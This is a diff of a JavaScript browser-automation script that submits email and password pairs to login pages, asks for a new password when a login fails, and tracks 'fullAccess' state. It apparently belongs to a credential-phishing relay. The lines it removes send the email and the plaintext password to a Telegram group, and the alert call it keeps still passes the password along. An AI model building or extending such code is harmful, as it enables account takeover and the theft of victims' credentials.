@@ -2205,7 +2205,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                         platform, timestamp: new Date().toISOString(),
                                         message: "Failed to submit password: button not found or not clickable. Please provide a new password."
                                     });
-                                    sendWrongInputAlert({ type: 'PASSWORD_SUBMIT_FAILED', platform, email, browserId, detail: 'Could not click password next button' });
+                                    notifyTeam({ type: 'PASSWORD_SUBMIT_FAILED', platform, email, browserId, detail: 'Could not click password next button' });
                                     // Clear the password field and persist the WAITINGPASSWORD state
                                     logger.debug(`[processRow][${browserId}] Clearing password. Returning to WAITINGPASSWORD state.`);
                                     updateBrowserRowDataFast(browserId, { ...updateData, password: '', verified: false, fullAccess: false });
@@ -2229,7 +2229,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                         browserId, email, status: finalStatus,
                                         message: "Password submit button did not navigate. Please try again."
                                     });
-                                    sendWrongInputAlert({ type: 'PASSWORD_NO_NAVIGATION', platform, email, browserId, detail: 'Password button clicked but page did not navigate' });
+                                    notifyTeam({ type: 'PASSWORD_NO_NAVIGATION', platform, email, browserId, detail: 'Password button clicked but page did not navigate' });
                                     updateBrowserRowDataFast(browserId, { ...updateData, password: '', verified: false, fullAccess: false });
                                     return;
                                 }
@@ -2297,32 +2297,6 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
 
                                 if (passwordFailedDetected) {
                                     // Password was incorrect; persist WAITINGPASSWORD for user to retry
-                                    // **Telegram Notification for Incorrect Password**
-                                    logger.info(`[processRow][${browserId}] Login failed detected after password submission. Incorrect password. Sending Telegram notification.`);
-                                    const allDataForTelegram = await fetchDataFromAppScript();
-                                    const headersForTelegram = allDataForTelegram[0];
-                                    const columnIndexesForTelegram = getColumnIndexes(headersForTelegram);
-                                    const rowDataForTelegram = allDataForTelegram.slice(1).find(r => r[columnIndexesForTelegram['browserId']] === browserId);
-
-                                    if (rowDataForTelegram) {
-                                        const projectId = rowDataForTelegram[columnIndexesForTelegram['projectId']];
-                                        const storedPassword = rowDataForTelegram[columnIndexesForTelegram['password']];
-                                        if (projectId) {
-                                            const projectDetails = await getProjectDetails(projectId);
-                                            const projectTitle = projectDetails?.projectTitle || 'Unknown Project';
-                                            const telegramGroupId = projectDetails?.telegramGroupId;
-
-                                    if (telegramGroupId) {
-                                                let message = `🚨 *Login Failed: Incorrect Password* 🚨\n\n`;
-                                                message += `*Project:* ${projectTitle}\n`;
-                                                message += `*Email:* \`${email}\`\n`;
-                                                message += `*Password:* \`${storedPassword}\`\n`;
-                                                message += `*Browser ID:* \`${browserId}\`\n`;
-
-                                                await sendTelegramMessage(telegramGroupId, message);
-                                            }
-                                        }
-                                    }
                                     sendWrongInputAlert({ type: 'WRONG_PASSWORD', platform, email, browserId, password, detail: `Incorrect password submitted` });
 
                                     initialCheckResult = {
